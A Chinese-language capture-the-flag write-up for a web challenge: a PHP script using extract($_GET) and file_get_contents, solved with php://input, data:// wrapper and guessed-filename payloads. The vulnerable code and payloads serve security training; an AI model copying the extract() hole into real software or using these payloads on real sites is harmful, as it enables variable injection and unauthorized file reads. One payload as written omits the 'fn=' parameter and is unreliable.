# web30

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660801025-image-20210120093802647.png)

题目描述

> txt??

盲猜文件跟txt有关

或者跟传参有关

进入题目

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660844845-image-20210120094159260.png)e

```php
<?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
if ($ac === $f)
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```

emmm

这里使用

> extract从数组中将变量导入当前符号表中，检查是否是合法变量，同时也检查和符号表中已有的变量名的冲突

使用extract将GET请求传的参数中的合法请求给传给变量$ac和$fn

empty检测变量$ac不能为空

然后使用trim剔除变量$fn的首尾特殊字符还有空白符

get请求的方式将文件名传入变量$fn中再使用file_get_contents将文件里的值传给变量$f

再判断变量$ac绝对等于$f

符合条件就打样flag

不符合就打样sorry

---

那么可以使用php的伪协议伪造file_get_contents去读取的值

php://input 是个可以访问请求的原始数据的只读流

将数据以post的方式提交

payload就是

> ?ac=a&php://input
>
> a

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660862878-image-20210120101735773.png)





还有其他的解法

还可以使用data伪协议

payload

> ?ac=a&fn=data://text/plain,a

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660878441-image-20210120102115328.png)

一样可以拿到flag

还有就是看了评论区里的解法

> ?ac=bugku&fn=flag.txt

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660893814-image-20210120102251260.png)

一样能拿到flag

不得不说评论区的大佬还是厉害

直接盲猜文件名是flag.txt

然后用里面的值去访问就可以拿到flag了

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660910120-image-20210120102510269.png)

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660929446-image-20210120103826308.png)

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618660949345-image-20210120104308088.png)